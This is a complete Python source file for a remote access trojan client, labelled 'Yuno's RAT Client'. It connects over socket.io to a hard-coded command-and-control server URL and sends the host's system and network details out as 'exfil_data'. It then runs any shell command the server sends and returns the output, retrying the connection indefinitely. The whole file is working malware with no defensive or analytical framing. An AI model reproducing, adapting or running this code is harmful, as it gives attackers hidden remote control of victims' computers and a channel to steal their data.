#!/usr/bin/env python3
import platform
import subprocess
import json
import time
import os
from socketio import Client
import netifaces

# Server settings
SERVER_URL = "https://c2-backend-wily.onrender.com"  # Your Render URL

def get_system_info():
    """Gather system information."""
    info = {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.release(),
        "architecture": platform.machine(),
    }
    return info

def get_network_info():
    """Gather network interface information."""
    interfaces = netifaces.interfaces()
    network_info = {}
    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            for addr in addrs[netifaces.AF_INET]:
                network_info[iface] = addr.get("addr", "Unknown")
    return network_info

def execute_command(command):
    """Execute a system command and return the output based on current directory."""
    try:
        if command.strip().lower().startswith("cd "):
            # Extract directory from 'cd' command
            target_dir = command.strip().split("cd ", 1)[1].strip()
            try:
                os.chdir(target_dir)
                return f"Changed directory to {os.getcwd()}"
            except Exception as e:
                return f"Error changing directory: {e}"
        else:
            # Execute other commands in the current directory
            result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=os.getcwd())
            return result.stdout + result.stderr
    except Exception as e:
        return f"Error executing command: {e}"

def main():
    sio = None
    try:
        sio = Client()
        
        @sio.event
        def connect():
            print("[*] Connected to RAT server")
            # Exfiltrate system and network info
            system_info = get_system_info()
            network_info = get_network_info()
            exfil_data = {
                "system": system_info,
                "network": network_info,
                "type": "system_info"
            }
            sio.emit('exfil_data', json.dumps(exfil_data))
            print("[*] Exfiltrated data sent to RAT server")

        @sio.event
        def disconnect():
            print("[*] Disconnected from RAT server")

        @sio.event
        def connect_error(data):
            print(f"[!] Connection failed: {data}")

        @sio.event
        def command(data):
            print(f"[*] Received command: {data}")
            if data.strip().lower() == "exit":
                print("[*] Received exit command")
                sio.disconnect()
                return
            # Execute the command and send back the result
            output = execute_command(data)
            print(f"[*] Executed command: {data}")
            # Send the output back with a type indicator
            sio.emit('exfil_data', json.dumps({
                "type": "command_output",
                "command": data,
                "output": output,
                "current_dir": os.getcwd()
            }))

        while True:
            try:
                sio.connect(SERVER_URL, transports=['websocket'])
                sio.wait()
                break
            except Exception as e:
                print(f"[!] Connection failed: {e}")
                print("[*] Retrying in 5 seconds...")
                time.sleep(5)
    finally:
        if sio is not None:
            sio.disconnect()

if __name__ == "__main__":
    print("=== Yuno's RAT Client ===")
    print("A remote access client by Yuno\n")
    main()